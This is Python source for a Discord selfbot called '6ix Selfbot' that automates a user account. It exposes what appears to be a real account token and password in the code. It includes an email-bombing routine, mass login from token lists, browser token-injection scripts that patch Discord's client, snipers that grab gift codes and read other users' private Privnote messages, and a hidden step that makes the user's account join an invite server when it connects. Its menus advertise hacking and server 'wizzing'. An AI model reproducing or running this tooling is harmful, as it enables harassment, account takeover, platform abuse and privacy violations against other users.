class SELFBOT():
    __linecount__ = 1933
    __version__ = 2.0
    

	
import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS

ctypes.windll.kernel32.SetConsoleTitleW(f'[6ix Selfbot v{SELFBOT.__version__}] | Loading...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('NjU1NjAxODU2NzY4Mzc2ODMz.XpoVHw.1hNqXoWdMkNgXsV-zht-X92rk5k')
password = config.get('dtstheone')
prefix = config.get('z')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.RED}[ERROR] {Fore.CYAN}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Client.run(token, bot=False, reconnect=True)
            os.system(f'title (6ix Selfbot) - Version {SELFBOT.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.RED}[ERROR] {Fore.CYAN}Improper token has been passed"+Fore.RESET)
            os.system('pause >NUL')

def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

async def SendWhook():
    url = ""
    whook = {
        "embeds": [
            {
                "title": "",
                "description": "",
                "thumbnail": {
                    "url": ""
                },
                "footer": {
                    "text": ""
                }
            }
        ]
    }
    async with aiohttp.ClientSession() as session:
        await session.post(url, json=whook)

def GenAddress(addy: str):
	letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	four_char = ''.join(random.choice(letters) for _ in range(4))
	should_abbreviate = random.randint(0,1)
	if should_abbreviate == 0:
		if "street" in addy.lower():
			addy = addy.replace("Street", "St.")
			addy = addy.replace("street", "St.")
		elif "st." in addy.lower():
			addy = addy.replace("st.", "Street")
			addy = addy.replace("St.", "Street")
		if "court" in addy.lower():
			addy = addy.replace("court", "Ct.")
			addy = addy.replace("Court", "Ct.")
		elif "ct." in addy.lower():
			addy = addy.replace("ct.", "Court")
			addy = addy.replace("Ct.", "Court")
		if "rd." in addy.lower():
			addy = addy.replace("rd.", "Road")
			addy = addy.replace("Rd.", "Road")
		elif "road" in addy.lower():
			addy = addy.replace("road", "Rd.")
			addy = addy.replace("Road", "Rd.")
		if "dr." in addy.lower():
			addy = addy.replace("dr.", "Drive")
			addy = addy.replace("Dr.", "Drive")
		elif "drive" in addy.lower():
			addy = addy.replace("drive", "Dr.")
			addy = addy.replace("Drive", "Dr.")
		if "ln." in addy.lower():
			addy = addy.replace("ln.", "Lane")
			addy = addy.replace("Ln.", "Lane")
		elif "lane" in addy.lower():
			addy = addy.replace("lane", "Ln.")
			addy = addy.replace("lane", "Ln.")
	random_number = random.randint(1,99)
	extra_list = ["Apartment", "Unit", "Room"]
	random_extra = random.choice(extra_list)
	return four_char + " " + addy + " " + random_extra + " " + str(random_number)

def BotTokens():
    with open('Data/Tokens/bot-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

def UserTokens():
    with open('Data/Tokens/user-tokens.txt', 'a+') as f:
        tokens = {token.strip() for token in f if token}
    for token in tokens:
        yield token

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

def _masslogin(choice):
    if choice == 'user':
        for token in UserTokens():
            loop.run_until_complete(Login().start(token, bot=False))
    elif choice == 'bot':
        for token in BotTokens():
            loop.run_until_complete(Login().start(token, bot=True))
    else:
        return        

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f

def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url)+'\n')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "6ix wizzed"

colorama.init()
Client = discord.Client()
Client = commands.Bot(
    description='6ix Selfbot',
    command_prefix=prefix,
    self_bot=True
)
Client.remove_command('help') 


@tasks.loop(seconds=3)
async def btc_status():
    r = requests.get('https://api.coindesk.com/v1/bpi/currentprice/btc.json').json()
    value = r['bpi']['USD']['rate']
    await asyncio.sleep(3)
    btc_stream = discord.Streaming(
        name="Current BTC price: "+value+"$ USD", 
        url="https://www.twitch.tv/pix", 
    )
    await Client.change_presence(activity=btc_stream)

@Client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.RED}[ERROR]: {Fore.CYAN}{error_str}"+Fore.RESET)

@Client.event
async def on_message_edit(before, after):
    await Client.process_commands(after)

@Client.event
async def on_message(message):

    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.CYAN}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.CYAN}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.CYAN}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.CYAN}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.CYAN}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.CYAN}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.CYAN}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.CYAN}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.CYAN}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.CYAN}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.CYAN}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.CYAN}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)        

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
        if nitro_sniper == True:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)
        else:
            return
            
    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{Client.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if 'privnote.com' in message.content:
        if privnote_sniper == True:
            code = re.search('privnote.com/(.*)', message.content).group(1)
            link = 'https://privnote.com/'+code
            try:
                note_text = pn.read_note(link)
            except Exception as e:
                print(e)    
            with open(f'Privnote/{code}.txt', 'a+') as f:
                print(""
                f"\n{Fore.CYAN}[{time} - Privnote Sniped]"+Fore.RESET)
                PrivnoteData(code)
                f.write(note_text)
        else:
            return
    await Client.process_commands(message)

@Client.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"

    if privnote_sniper == True:
        privnote = "Active"
    else:
        privnote = "Disabled"    

    print(f'''{Fore.RESET}
                      

                                                                                                                        
{Fore.CYAN}                                                .6*"   `7MMF'`YMM'   `MP' 
{Fore.RED}                                               ,M'        MM    VMb.  ,P   
{Fore.GREEN}                                              ,Mbmmm.     MM     `MM.M'    
{Fore.CYAN}                                              6M'  `Mb.   MM       MMb     
{Fore.RED}                                              MI     M8   MM     ,M'`Mb.   
{Fore.GREEN}                                              WM.   ,M9   MM    ,P   `MM.  
{Fore.CYAN}                                               WMbmmd9  .JMML..MM:.  .:MMa.

                    

                       {Fore.CYAN}Client {SELFBOT.__version__} | {Fore.RED}Logged in as: {Client.user.name}#{Client.user.discriminator} {Fore.CYAN}| ID: {Fore.RED}{Client.user.id}   
                       {Fore.CYAN}Privnote Sniper | {Fore.RED}{privnote}
                       {Fore.CYAN}Nitro Sniper | {Fore.RED}{nitro}
                       {Fore.CYAN}Giveaway Sniper | {Fore.RED}{giveaway}
                       {Fore.CYAN}SlotBot Sniper | {Fore.RED}{slotbot}
                       {Fore.CYAN}Prefix: {Fore.RED} {prefix}
    '''+Fore.RESET)
    ctypes.windll.kernel32.SetConsoleTitleW(f'[6ix Selfbot v{SELFBOT.__version__}] | Logged in as {Client.user.name}')
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    r = requests.post('https://discordapp.com/api/v6/invite/4jTxrpT', headers=headers)
    if r.status_code == 200:
        return True
    else:
        return False

@Client.command()
async def clear(ctx): # b'\xfc'
    await ctx.message.delete()
    await ctx.send('ﾠﾠ'+'\n' * 400 + 'ﾠﾠ')

@Client.command()
async def genname(ctx): # b'\xfc'
    await ctx.message.delete()
    first, second = random.choices(ctx.guild.members, k=2)
    first = first.display_name[len(first.display_name) // 2:]
    second = second.display_name[:len(second.display_name) // 2]
    await ctx.send(discord.utils.escape_mentions(second + first))

@Client.command()
async def lmgtfy(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    q = urlencode({"q": message})
    await ctx.send(f'<https://lmgtfy.com/?{q}>')

@Client.command()
async def login(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{_token}")')    

@Client.command()
async def botlogin(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
    function login(token) {
      ((i) => {
        window.webpackJsonp.push([  
          [i], {
            [i]: (n, b, d) => {
              let dispatcher;
              for (let key in d.c) {
                if (d.c[key].exports) {
                  const module = d.c[key].exports.default || d.c[key].exports;
                  if (typeof(module) === 'object') {
                    if ('setToken' in module) {
                      module.setToken(token);
                      module.hideToken = () => {};
                    }
                    if ('dispatch' in module && '_subscriptions' in module) {
                      dispatcher = module;
                    }
                    if ('AnalyticsActionHandlers' in module) {
                      console.log('AnalyticsActionHandlers', module);
                      module.AnalyticsActionHandlers.handleTrack = (track) => {};
                    }
                  } else if (typeof(module) === 'function' && 'prototype' in module) {
                    const descriptors = Object.getOwnPropertyDescriptors(module.prototype);
                    if ('_discoveryFailed' in descriptors) {
                      const connect = module.prototype._connect;
                      module.prototype._connect = function(url) {
                        console.log('connect', url);
                        const oldHandleIdentify = this.handleIdentify;
                        this.handleIdentify = () => {
                          const identifyData = oldHandleIdentify();
                          identifyData.token = identifyData.token.split(' ').pop();
                          return identifyData;
                        };
                        const oldHandleDispatch = this._handleDispatch;
                        this._handleDispatch = function(data, type) {
                          if (type === 'READY') {
                            console.log(data);
                            data.user.bot = false;
                            data.user.email = '6ix-Was-Here@Fuckyou.com';
                            data.analytics_tokens = [];
                            data.connected_accounts = [];
                            data.consents = [];
                            data.experiments = [];
                            data.guild_experiments = [];
                            data.relationships = [];
                            data.user_guild_settings = [];
                          }
                          return oldHandleDispatch.call(this, data, type);
                        }
                        return connect.call(this, url);
                      };
                    }
                  }
                }
              }
              console.log(dispatcher);
              if (dispatcher) {
                dispatcher.dispatch({
                  type: 'LOGIN_SUCCESS',
                  token
                });
              }
            },
          },
          [
            [i],
          ],
        ]);
      })(Math.random());
    }
    """ 
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("Bot {_token}")')

@Client.command()
async def address(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    addy = ' '.join(text)
    address_array = []
    i = 0
    while i < 10:
        address_array.append(GenAddress(addy))
        i+=1
    final_str = "\n".join(address_array)
    em = discord.Embed(description=final_str)
    try:
        await ctx.send(embed=em)
    except:
        await ctx.send(final_str)    

@Client.command()
async def help(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.add_field(name="`𝐇𝐄𝐋𝐏`",value="𝐬𝐡𝐨𝐰𝐬 𝐡𝐞𝐥𝐩 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬",inline=False)
    em.add_field(name="`𝐂𝐌𝐃`",value="𝐀 𝐥𝐢𝐬𝐭 𝐨𝐟 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬",inline=False)
    em.add_field(name="`𝐍𝐒𝐅𝐖`",value="𝐮𝐮𝐮𝐡 𝐧𝐨𝐭 𝐟𝐨𝐫 𝐤𝐢𝐝𝐬 :) ",inline=False)
    em.add_field(name="`𝐀𝐌𝐂`",value="𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐦𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭",inline=False)
    em.add_field(name="`𝐔𝐓𝐈𝐋`",value="`𝐔𝐭𝐢𝐥𝐢𝐭𝐲 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬`",inline=False)
    em.add_field(name="`𝐅𝐔𝐍`",value="𝐟𝐮𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬",inline=False)
    em.add_field(name="`𝐇𝐀𝐂𝐊𝐈𝐍𝐆`",value="𝐨𝐛𝐯 𝐡𝐚𝐜𝐤𝐢𝐧𝐠 𝐝𝐮𝐡 -_-",inline=False)   
    em.add_field(name="`𝐖𝐈𝐙𝐙𝐈𝐍𝐆`",value="𝐟𝐨𝐫 𝐫𝐚𝐩𝐢𝐧𝐠 𝐬𝐞𝐫𝐯𝐞𝐫𝐬",inline=False)   
    em.add_field(name="`𝐏𝐑𝐎𝐉𝐄𝐂𝐓 𝟔𝐈𝐗`",value="𝐰𝐞 𝐮𝐩 𝐧𝐞𝐱𝐭",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)
@Client.command()
async def cmd(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐂𝐌𝐃")
    em.add_field(name="`💔𝐚𝐯`",value="Displays the profile picture of the mentioned user",inline=False)
    em.add_field(name="`💔𝐫𝐞𝐯𝐚𝐯`",value="Reverse avatar the mentioned user profile picture",inline=False)
    em.add_field(name="`💔𝐰𝐡𝐨𝐢𝐬`",value="Displays discord information of the mentioned user",inline=False)
    em.add_field(name="`💔𝐫𝐨𝐥𝐞-𝐡𝐞𝐱𝐜𝐨𝐝`",value="Displays the hexcode of the specified role",inline=False)
    em.add_field(name="`💔𝐠𝐮𝐢𝐥𝐝𝐢𝐜𝐨𝐧`",value="Display guild icon",inline=False)
    em.add_field(name="`💔𝐫𝐨𝐥𝐞𝐢𝐧𝐟𝐨`",value="Display some info about the specified role",inline=False)
    em.add_field(name="`💔𝐜𝐥𝐬`",value="Clears your console fully",inline=False)
    em.add_field(name="`💔𝐥𝐨𝐠𝐨𝐮𝐭`",value="Logs you out the selfbot",inline=False)
    em.add_field(name="`💔𝐝𝐦`",value="Sends a message to the specified user",inline=False)
    em.add_field(name="`💔𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞`",value="Glitched way to mention everyone in a server",inline=False)
    em.add_field(name="`💔𝐞𝐦𝐩𝐭𝐲`",value="Sends a empty message",inline=False)
    em.add_field(name="`💔𝐠𝐞𝐭-𝐡𝐰𝐢𝐝`",value="Prints your hwid in the console",inline=False)
    em.add_field(name="`💔𝐬𝐞𝐜𝐫𝐞𝐭`",value="Returns the message but hidden ||hidden||",inline=False)
    em.add_field(name="`💔𝐛𝐨𝐥𝐝`",value="Returns the message but **bold**",inline=False)
    em.add_field(name="`💔𝐫𝐞𝐯𝐞𝐫𝐬𝐞`",value="Reverses ur message",inline=False)
    em.add_field(name="`💔𝐚𝐬𝐜𝐢𝐢 `",value="Makes your message ascii/fancy",inline=False)
    em.add_field(name="`💔𝐫𝐞𝐚𝐝`",value="Marks all your messages as read, except DM",inline=False)
    em.add_field(name="`💔𝐠𝐫𝐨𝐮𝐩-𝐥𝐞𝐚𝐯𝐞𝐫`",value="Leaves all the groups you're in",inline=False)
    em.add_field(name="`💔𝐩𝐮𝐫𝐠𝐞`",value="Deletes your messages based on the amount you specify",inline=False)
    em.add_field(name="`💔𝐮𝐩𝐭𝐢𝐦𝐞`",value="Shows how long the selfbot has been online and working",inline=False)
    em.add_field(name="`💔𝐡𝐚𝐬𝐭𝐞𝐛𝐢𝐧`",value="Saves your text/code to hastebin",inline=False)
    em.add_field(name="`💔𝐟𝐢𝐫𝐬𝐭-𝐦𝐞𝐬𝐬𝐚𝐠𝐞`",value="Get the first message in that channel",inline=False)
    em.add_field(name="`💔𝐚𝐛𝐜`",value="Sends the whole abecedary in a single message",inline=False)
    em.add_field(name="`💔𝐝𝐞𝐯𝐨𝐰𝐞𝐥`",value="Devowels your message",inline=False)
    em.add_field(name="`💔𝟏𝟑𝟑𝟕-𝐬𝐩𝐞𝐚𝐤`",value="Translates your message to 1337 language",inline=False)
    em.add_field(name="`💔𝐜𝐨𝐦𝐛𝐢𝐧𝐞 (name1) (name2)`",value="Combines the two names together",inline=False)
    em.add_field(name="`💔𝐩𝐢𝐧𝐠𝐰𝐞𝐛`",value="Pings a website in order to check if its working or not (ie: !pingweb https://google.com)",inline=False)
    em.add_field(name="`💔𝐬𝐩𝐚𝐦 (amount) (message)`",value="Sends the specified message that amount of times",inline=False)
    em.add_field(name="`💔𝐜𝐥𝐞𝐚𝐫`",value="Spam the chat with invisible messages",inline=False)
    em.add_field(name="`💔𝐭𝐭𝐬`",value="Send that message in .wav format, like an audio",inline=False)
    em.add_field(name="`💔𝐮𝐩𝐩𝐞𝐫`",value="Make your message CAPS",inline=False)
    em.add_field(name="`💔𝐈𝐦𝐠𝐭𝐟𝐲`",value="Use lmgtfy search engine to look-up something",inline=False)
    em.add_field(name="`💔𝐠𝐞𝐧𝐧𝐚𝐦𝐞`",value="Generate a random name based on the server members",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)
@Client.command()
async def nsfw(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐍𝐒𝐅𝐖")
    em.add_field(name="`💔𝐥𝐞𝐬𝐛𝐢𝐚𝐧`",value="Random lesbian",inline=False)
    em.add_field(name="`💔𝐥𝐞𝐰𝐝𝐣𝐞𝐤𝐨`",value="Random lewd neko",inline=False)
    em.add_field(name="`💔𝐛𝐥𝐨𝐰𝐣𝐨𝐛`",value="Random blowjob",inline=False)
    em.add_field(name="`💔𝐭𝐢𝐭𝐬`",value="Random tits",inline=False)
    em.add_field(name="`💔𝐛𝐨𝐨𝐛𝐬`",value="Random boobs ",inline=False)
    em.add_field(name="`💔𝐡𝐞𝐧𝐭𝐚𝐢`",value="Random hentai",inline=False)
    em.add_field(name="`💔𝐟𝐞𝐞𝐭`",value="Random feet",inline=False)
    em.add_field(name="`💔𝐞𝐫𝐨𝐟𝐞𝐞𝐭`",value="Random erotic feet",inline=False)
    em.add_field(name="`💔𝐚𝐧𝐚𝐥`",value="Random anal",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)

@Client.command()
async def amc(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐀𝐌𝐂")
    em.add_field(name="`💔𝐬𝐞𝐭-𝐩𝐟𝐩`",value="Set the specified url as profile picture",inline=False)
    em.add_field(name="`💔𝐛𝐭𝐜𝐬𝐭𝐫𝐞𝐚𝐦`",value="Stream current btc price",inline=False)
    em.add_field(name="`💔𝐩𝐟𝐩𝐬𝐭𝐞𝐚𝐥`",value="Allows you to steal mentioned user profile picture",inline=False)
    em.add_field(name="`💔𝐛𝐥𝐚𝐧𝐤`",value="Turns your name and profile picture blank",inline=False)
    em.add_field(name="`💔𝐡𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝`",value="Allows you to change your hypesquad (ie: !hypesquad bravery)",inline=False)
    em.add_field(name="`💔𝐟𝐚𝐤𝐞𝐧𝐞𝐭`",value="Allows you to spoof connections in your profile (ie: !fakenet skype 6ix)",inline=False)
    em.add_field(name="`💔𝐬𝐭𝐞𝐚𝐥-𝐚𝐥𝐥-𝐩𝐟𝐩`",value="ion gotta explain -_-",inline=False)
    em.add_field(name="`💔𝐬𝐞𝐭𝐒`",value="Stream that message in your profile",inline=False)
    em.add_field(name="`💔𝐬𝐞𝐭𝐆`",value="Add a watching status with that message in your profile",inline=False)
    em.add_field(name="`💔𝐬𝐞𝐭𝐋`",value="Add a listening status with that message in your profile",inline=False)
    em.add_field(name="`💔𝐬𝐞𝐭𝐖`",value="Add a game status with that message in your profile",inline=False)
    em.add_field(name="`💔𝐦𝐚𝐬𝐬𝐜𝐨𝐧`",value="Add a big amount of connections to your profile ie: !masscon skype 5 6IX",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)

@Client.command()
async def fun(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed()
    em.set_author(name="𝐅𝐔𝐍")
    em.add_field(name="`💔𝐟𝐨𝐱`",value="Random fox image",inline=False)
    em.add_field(name="`💔𝐝𝐨𝐠`",value="Random dog image",inline=False)
    em.add_field(name="`💔𝐜𝐚𝐭`",value="Random cat image",inline=False)
    em.add_field(name="`💔𝐦𝐢𝐧𝐞𝐬𝐰𝐞𝐞𝐩𝐞𝐫`",value="Play minesweeper in the discord chat",inline=False)
    em.add_field(name="`💔𝐫𝐚𝐢𝐧𝐛𝐨𝐰`",value="Doesn't work for now Pix will fix it soon",inline=False)
    em.add_field(name="`💔𝟖𝐛𝐚𝐥𝐥`",value="Answers your question",inline=False)
    em.add_field(name="`💔𝐣𝐨𝐤𝐞`",value="Drops a random joke in the chat",inline=False)
    em.add_field(name="`💔𝐬𝐥𝐨𝐭`",value="Play slot machine in the discord chat",inline=False)
    em.add_field(name="`💔𝐭𝐨𝐩𝐢𝐜`",value="Start a random topic to keep the chat going",inline=False)
    em.add_field(name="`💔𝐰𝐲𝐫`",value="Start a 'what would you rather' topic in the chat",inline=False)
    em.add_field(name="`💔𝐟𝐞𝐞𝐝`",value="Feed the mentioned user",inline=False)
    em.add_field(name="`💔𝐭𝐢𝐜𝐤𝐥𝐞`",value="Tickle the mentioned user",inline=False)
    em.add_field(name="`💔𝐡𝐮𝐠`",value="Hug the mentioned user",inline=False)
    em.add_field(name="`💔𝐬𝐥𝐚𝐩`",value="Slap the mentioned user",inline=False)
    em.add_field(name="`💔𝐬𝐦𝐮𝐠`",value="Smug at the mentioned user",inline=False)
    em.add_field(name="`💔𝐩𝐚𝐭`",value="Pat the mentioned user",inline=False)
    em.add_field(name="`💔𝐤𝐢𝐬𝐬`",value="Kiss the mentioned user",inline=False)
    em.set_image(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    em.set_footer(text="by Pix⁶ⁱˣ#0011")
    em.set_thumbnail(url="https://media.giphy.com/media/cj2C92tDF1YdNt7SjO/giphy.gif")
    await ctx.send(embed=em)
